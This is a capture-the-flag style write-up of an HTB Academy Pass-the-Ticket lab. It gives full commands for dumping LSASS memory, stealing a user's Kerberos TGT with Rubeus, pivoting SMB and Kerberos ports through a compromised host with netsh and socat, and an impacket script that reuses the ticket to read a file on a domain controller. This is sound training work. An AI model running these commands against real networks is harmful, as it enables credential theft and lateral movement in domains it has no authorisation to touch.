# Pass-the-Ticket

**Module:** HTB Academy — Kerberos Attacks
**Entry point:** `ACADEMY-KERBATTCK-WS01` (10.129.70.142), domain `INLANEFREIGHT.LOCAL` — solved entirely via `wmiexec.py`/impacket, no actual RDP/GUI session opened
**Given access:** `htb-student` / `HTB_@cademy_stdnt!` (local admin on WS01)
**Goal:** extract `jefferson.matts`'s Kerberos ticket, use it to connect to DC01, read `C:\Users\jefferson.matts\Downloads\ptt.txt`

**Result:** `P4SS_Th3_T1ckEt_IsFUN` — read `jefferson.matts`'s file on DC01 by lifting their cached TGT off WS01 with Rubeus and re-using it (Pass-the-Ticket) from Linux via impacket.

---

## 1. Attack chain (summary)

1. Confirm creds/admin on WS01: `nxc smb 10.129.70.142 -u htb-student -p 'HTB_@cademy_stdnt!'`.
2. Extract `jefferson.matts`'s cached Kerberos TGT from WS01's LSA secrets using the pre-installed `C:\Tools\Rubeus.exe dump /user:jefferson.matts /nowrap` (base64 kirbi, no file drop needed).
3. Decode the base64 to a `.kirbi`, convert to a `.ccache` with impacket's `ticketConverter.py`.
4. The DC lives on an internal-only NIC off WS01 (`172.16.99.3`, same topology as the `Golden Ticket.md`/`Silver Ticket.md` tasks) — pivot both SMB (445) and Kerberos (88) through WS01 (`netsh portproxy` + local `socat` hop), since the lifted ticket is a **TGT**, not a pre-built service ticket, so a real TGS request against the real KDC is required (unlike a Silver/Golden Ticket, which is self-contained).
5. `KRB5CCNAME=jefferson.ccache`, raw `impacket.smbconnection.SMBConnection.kerberosLogin()` against DC01 through the pivot → `getFile` the flag.

---

## 2. Where I got stuck (and the actual fixes)

### 2.1 First LSASS-dump attempt (`comsvcs.dll` MiniDump) produced a tiny, useless dump

```
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 672 C:\Windows\Temp\lsass.dmp full
```
via `wmiexec.py` produced a ~50KB file (a real full LSASS dump should be tens of MB). Re-ran via `psexec.py` (SYSTEM context) instead — this time the dump call itself errored (process exit code `2147942699` = HRESULT wrapping Win32 `0x12B` = `ERROR_PARTIAL_COPY`, "only part of a ReadProcessMemory... request was completed") and wrote a 0-byte file. Checked `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL` — not set, so this wasn't LSA Protection (PPL) blocking it; `rundll32.exe` run directly (without a tool that explicitly enables `SeDebugPrivilege` in its own token first) just doesn't reliably get full memory access to a protected process like LSASS, regardless of the calling account's privileges being listed as "Enabled" by `whoami /priv`. Abandoned the raw-DLL approach entirely rather than chase registry/driver-level workarounds.

### 2.2 Fix: use the purpose-built tool already on the box

`C:\Tools\Rubeus.exe` was present from earlier modules in this series. `Rubeus.exe dump` handles the privilege-enabling and LSA-handle-opening correctly internally and returns ticket data directly as base64 — no dump file, no download step, no DLL-export fragility:
```
C:\Tools\Rubeus.exe dump /user:jefferson.matts /nowrap
```
Worked on the first try, returning `jefferson.matts`'s TGT (`krbtgt/INLANEFREIGHT.LOCAL`) as a single base64 blob.

### 2.3 `kerberosLogin` with the lifted ticket needed a real KDC, not just DC01's SMB port

First attempt only pivoted SMB (445) to DC01 and got:
```
OSError: [Errno Connection error (127.0.0.1:88)] [Errno 111] Connection refused
```
Unlike the Silver/Golden Ticket tasks' forged ccaches (which carried a ready-made *service* ticket), `Rubeus.exe dump` yields a **TGT**. `impacket`'s `kerberosLogin` with a TGT-only ccache has to perform a real S4U/TGS-REQ against the actual KDC to get a `cifs/DC01...` service ticket before it can authenticate SMB — there's no way around contacting port 88 for real. Fixed by adding a second `netsh portproxy` + `socat` hop for Kerberos (88), identical in form to the one built for the Golden Ticket task, pointed at the same internal DC (`172.16.99.3`).

### 2.4 Stale `socat` from a previous task's pivot was still squatting on local port 445

```
socat[...] E bind(5, {AF=2 0.0.0.0:445}, 16): Address already in use
```
A `socat` process left running from an earlier session's Silver Ticket pivot (bound to the *old* target IP) hadn't been cleaned up. Found it with `ps aux | grep "socat TCP-LISTEN:445"`, killed it by PID, then started the correct pivot for this task's WS01 IP.

---

## 3. Full command sequence (as actually run)

```bash
# 1. Confirm creds
nxc smb 10.129.70.142 -u htb-student -p 'HTB_@cademy_stdnt!'

# 2. Dump jefferson.matts's ticket with the pre-installed Rubeus
wmiexec.py 'INLANEFREIGHT.LOCAL/htb-student:HTB_@cademy_stdnt!@10.129.70.142' \
    'C:\Tools\Rubeus.exe dump /user:jefferson.matts /nowrap'
# -> base64 kirbi blob (krbtgt/INLANEFREIGHT.LOCAL TGT for jefferson.matts)

# 3. Convert to ccache
echo '<base64 blob>' | base64 -d > jefferson.kirbi
ticketConverter.py jefferson.kirbi jefferson.ccache

# 4. Find the internal DC (same topology as prior tasks: 172.16.99.3)
wmiexec.py '...@10.129.70.142' "ipconfig | findstr IPv4"   # confirms 172.16.99.50 2nd NIC

# 5. Pivot SMB + Kerberos to the DC
wmiexec.py '...@10.129.70.142' "netsh interface portproxy add v4tov4 listenport=4455 listenaddress=0.0.0.0 connectport=445 connectaddress=172.16.99.3"
wmiexec.py '...@10.129.70.142' "netsh advfirewall firewall add rule name=proxysmbdc dir=in action=allow protocol=TCP localport=4455"
wmiexec.py '...@10.129.70.142' "netsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectport=88 connectaddress=172.16.99.3"
wmiexec.py '...@10.129.70.142' "netsh advfirewall firewall add rule name=proxykrb dir=in action=allow protocol=TCP localport=8888"
socat TCP-LISTEN:445,fork,reuseaddr TCP:10.129.70.142:4455 &
socat TCP-LISTEN:88,fork,reuseaddr  TCP:10.129.70.142:8888 &

# 6. Pass the ticket, read the flag
export KRB5CCNAME="$(pwd)/jefferson.ccache"
python3 - <<'EOF'
from impacket.smbconnection import SMBConnection
import io
conn = SMBConnection(remoteName='DC01.INLANEFREIGHT.LOCAL', remoteHost='127.0.0.1', sess_port=445)
conn.kerberosLogin(user='jefferson.matts', password='', domain='INLANEFREIGHT.LOCAL',
                    useCache=True, kdcHost='127.0.0.1')
buf = io.BytesIO()
conn.getFile('C$', 'Users\\jefferson.matts\\Downloads\\ptt.txt', buf.write)
print(buf.getvalue().decode())
EOF
# P4SS_Th3_T1ckEt_IsFUN
```

---

## 4. Flag

**`P4SS_Th3_T1ckEt_IsFUN`**

---

## 5. Key takeaways

- `Rubeus.exe dump` is far more reliable for lifting a specific user's cached Kerberos tickets than hand-rolling a `comsvcs.dll` LSASS minidump — the raw-DLL route can silently return a tiny/garbage dump (`ERROR_PARTIAL_COPY`) even from a locally-admin, non-PPL-protected box, because the privilege-enabling steps a real tool performs aren't automatic just from the calling account having the privilege available.
- A ticket lifted via Pass-the-Ticket is typically a **TGT**, not a ready-to-use service ticket — using it still requires a real TGS exchange against the actual KDC, unlike a forged Silver/Golden Ticket ccache which is fully self-contained offline. Plan the pivot accordingly (need port 88 reachable, not just the target service's port).
- When chaining pivots across multiple HTB Academy tasks in the same session, always check for and kill leftover `socat`/proxy processes bound to the ports you're about to reuse — a stale pivot from a previous (possibly now-decommissioned) target will silently fail to bind or point traffic at the wrong host.
